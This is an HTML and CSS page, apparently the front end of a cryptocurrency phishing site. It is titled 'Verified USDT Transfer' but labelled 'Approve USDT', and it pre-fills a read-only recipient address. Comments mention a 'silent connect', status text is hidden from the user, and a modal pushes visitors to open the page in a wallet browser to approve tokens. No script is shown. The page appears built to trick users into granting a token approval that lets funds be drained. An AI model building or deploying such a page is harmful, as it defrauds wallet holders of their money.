<!-- Silent connect + improved NEXT button states + spinner -->
<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="utf-8"/>
        <title>Verified USDT Transfer (silent connect + UI)</title>
        <meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover"/>
        <style>
            :root {
                --bg: #071025;
                --panel: rgba(255,255,255,0.02);
                --accent: #2563eb;
                --text: #e6eef8;
                --muted: #98a3bf;
                --placeholder: rgba(230,238,248,0.45);
                --modal-bg: rgba(2,6,23,0.75);
                --danger: #ef4444;
            }

            html,body {
                height: 100%;
                margin: 0;
                background: linear-gradient(180deg,#041026,#071025);
                font-family: Inter,system-ui,Arial,sans-serif;
                color: var(--text);
                -webkit-font-smoothing: antialiased
            }

            .viewport {
                min-height: 100svh;
                display: flex;
                flex-direction: column;
            }

            .center-wrap {
                flex: 1;
                display: flex;
                align-items: center;
                justify-content: center;
                padding: 18px;
                transition: transform 360ms cubic-bezier(.2,.9,.2,1), padding-bottom 360ms cubic-bezier(.2,.9,.2,1);
            }

            .center-wrap.lift {
                transform: translateY(-20vh);
            }

            .card {
                width: 100%;
                max-width: 520px;
                background: linear-gradient(180deg, rgba(255,255,255,0.014), rgba(255,255,255,0.01));
                border-radius: 14px;
                padding: 18px;
                box-shadow: 0 12px 36px rgba(2,6,23,0.65);
                border: 1px solid rgba(255,255,255,0.03);
            }

            label {
                display: block;
                font-size: 13px;
                color: var(--muted);
                margin-bottom: 8px
            }

            input[type="text"],input[type="number"] {
                width: 100%;
                padding: 12px 14px;
                border-radius: 10px;
                border: 1px solid rgba(255,255,255,0.04);
                background: rgba(255,255,255,0.015);
                color: var(--text);
                font-size: 16px;
                box-sizing: border-box;
                outline: none;
                transition: box-shadow 200ms ease, transform 200ms ease;
            }

            input[type="number"]:focus,input[type="text"]:focus {
                box-shadow: 0 8px 30px rgba(37,99,235,0.08);
                transform: translateY(-1px);
            }

            input[readonly] {
                opacity: 0.95
            }

            input::placeholder {
                color: var(--placeholder);
                font-weight: 500;
            }

            .spacer {
                height: 12px
            }

            /* Button */
            .btn {
                width: calc(100% - 36px);
                margin: 0 18px;
                position: fixed;
                left: 0;
                right: 0;
                bottom: 20px;
                max-width: 520px;
                margin-left: auto;
                margin-right: auto;
                padding: 14px;
                border-radius: 12px;
                border: 0;
                background: linear-gradient(90deg,var(--accent), #7c5cff);
                color: white;
                font-weight: 800;
                font-size: 16px;
                cursor: pointer;
                box-shadow: 0 10px 34px rgba(38,99,235,0.16);
                display: flex;
                align-items: center;
                justify-content: center;
                gap: 10px;
            }

            .btn:disabled {
                opacity: 0.65;
                cursor: not-allowed
            }

            .btn .btn-text {
                line-height: 1
            }

            /* spinner */
            .spinner {
                width: 18px;
                height: 18px;
                border-radius: 50%;
                border: 2px solid rgba(255,255,255,0.18);
                border-top-color: rgba(255,255,255,0.98);
                animation: spin 0.9s linear infinite;
                display: inline-block;
                vertical-align: middle
            }

            @keyframes spin {
                to {
                    transform: rotate(360deg)
                }
            }

            @media(min-width: 880px) {
                .center-wrap {
                    padding:40px 22px;
                }

                .card {
                    padding: 26px
                }

                .btn {
                    bottom: 28px
                }
            }

            /* Modal styles (unchanged from before) */
            .overlay {
                position: fixed;
                inset: 0;
                background: var(--modal-bg);
                display: none;
                align-items: center;
                justify-content: center;
                z-index: 9999;
                padding: 20px;
            }

            .overlay.show {
                display: flex;
            }

            .modal {
                width: 100%;
                max-width: 420px;
                background: linear-gradient(180deg,#061025,#071025);
                border-radius: 14px;
                padding: 20px;
                box-shadow: 0 20px 60px rgba(0,0,0,0.6);
                border: 1px solid rgba(255,255,255,0.04);
                color: var(--text);
                text-align: center;
                position: relative;
            }

            .modal .close {
                position: absolute;
                right: 18px;
                top: 16px;
                background: transparent;
                border: 0;
                color: var(--muted);
                font-size: 20px;
                cursor: pointer;
            }

            .modal-illustration {
                width: 56px;
                height: 56px;
                margin: 0 auto 8px;
                border-radius: 12px;
                display: flex;
                align-items: center;
                justify-content: center;
                background: linear-gradient(135deg,#ff758c,#ffb199);
                box-shadow: 0 8px 30px rgba(255,117,140,0.12);
            }

            .modal h3 {
                margin: 6px 0 6px 0;
                font-size: 18px;
            }

            .modal p {
                margin: 8px 0 18px 0;
                color: var(--muted);
                font-size: 14px;
            }

            .modal .ok-btn {
                padding: 10px 16px;
                border-radius: 10px;
                border: 0;
                background: linear-gradient(90deg,var(--accent), #7c5cff);
                color: white;
                font-weight: 700;
                cursor: pointer;
            }

            .modal .hint {
                margin-top: 10px;
                font-size: 12px;
                color: var(--muted);
            }

            @media (prefers-reduced-motion: reduce) {
                .center-wrap {
                    transition: none
                }

                .modal {
                    transition: none
                }
            }
        </style>
    </head>
    <body>
        <div class="viewport">
            <div class="center-wrap" id="centerWrap">
                <div class="card" role="main" aria-label="Approve USDT">
                    <div>
                        <label for="addr">Address</label>
                        <input id="addr" type="text" readonly/>
                    </div>
                    <div class="spacer"></div>
                    <div>
                        <label for="amount">Amount (USDT)</label>
                        <input id="amount" type="number" inputmode="decimal" step="any" placeholder="Enter amount in USDT"/>
                    </div>
                    <!-- Status & helper text removed (console logging only) -->
                </div>
            </div>
            <!-- Button: text + optional spinner element -->
            <button id="nextBtn" class="btn" disabled aria-live="polite">
                <span id="btnSpinner" style="display:none" class="spinner" aria-hidden="true"></span>
                <span id="btnText" class="btn-text">NEXT</span>
            </button>
        </div>
        <!-- Modal for missing wallet / messages -->
        <div id="noWalletOverlay" class="overlay" role="dialog" aria-modal="true" aria-labelledby="nwTitle" aria-describedby="nwDesc">
            <div class="modal">
                <button class="close" id="modalClose" aria-label="Close">✕</button>
                <div class="modal-illustration" aria-hidden="true">⚠️</div>
                <h3 id="nwTitle">Please open this in a wallet browser</h3>
                <p id="nwDesc">This page must be opened inside Trust Wallet or MetaMask's in-app browser (or another injected-dapp browser) to approve tokens.</p>
                <button id="modalOk" class="ok-btn">OK</button>
                <div class="hint">If you're on desktop, install MetaMask or open this page in your mobile wallet's browser.</div>
            </div>
        </div>
